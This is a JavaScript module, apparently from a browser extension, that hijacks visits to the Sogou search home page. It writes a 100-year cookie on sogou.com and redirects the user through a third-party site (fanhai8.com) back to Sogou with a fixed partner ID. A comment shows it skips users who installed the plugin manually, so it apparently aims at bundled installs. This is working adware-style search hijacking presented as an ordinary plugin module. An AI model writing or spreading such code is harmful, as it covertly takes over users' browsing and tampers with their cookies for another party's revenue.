__tk__define(function (require, exports, module) {
  var location = window.location,
    href = location.href,
    $ = require('../lib/jquery.min'),
    J = {
      utils: require('../utils')
    };


  // 自主安装渠道的插件不弹
  if (J.utils.isManualDId) {
    return;
  }

  //搜狗搜索页跳转
  //http://199.155.122.129:8080/pages/viewpage.action?pageId=19628566
  var sogouUrlJump = function () {
    document.location.href = 'http://www.fanhai8.com/redirect.html?www.sogou.com/index.php?pid=sogou-clse-55a0df4b5a1786cd';
  };
  /*if (href === 'http://123.sogou.com/') {
    document.location.href = 'http://123.sogou.com/?21848';
  }*/
  if (href.match(/www.sogou.com\/\?.*/) || href === "http://www.sogou.com/") {
    if (J.utils.cookie.get().sogouTK !== 'true') {
      // 0到9之间的随机数
      // var randomNum_0_9 = Math.floor(Math.random()*10);

      // 30%概率跳转链接
      // if (randomNum_0_9 < 3) {
      // cookie值设为'true'，禁止下次的链接跳转，防止死循环
      J.utils.cookie.set({
        name: 'sogouTK',
        value: 'true',
        day: 36500,
        path: '/',
        domain: 'sogou.com'
      });
      // cookie写入失败的场合（例如设置浏览器禁止写入cookie）不跳转链接
      if (J.utils.cookie.get().sogouTK === 'true') {
        sogouUrlJump();
      }
      // }
    } else {
      // cookie值设为'false'，允许下次的链接跳转
      J.utils.cookie.set({
        name: 'sogouTK',
        value: 'false',
        day: 36500,
        path: '/',
        domain: 'sogou.com'
      });
    }
  }
});
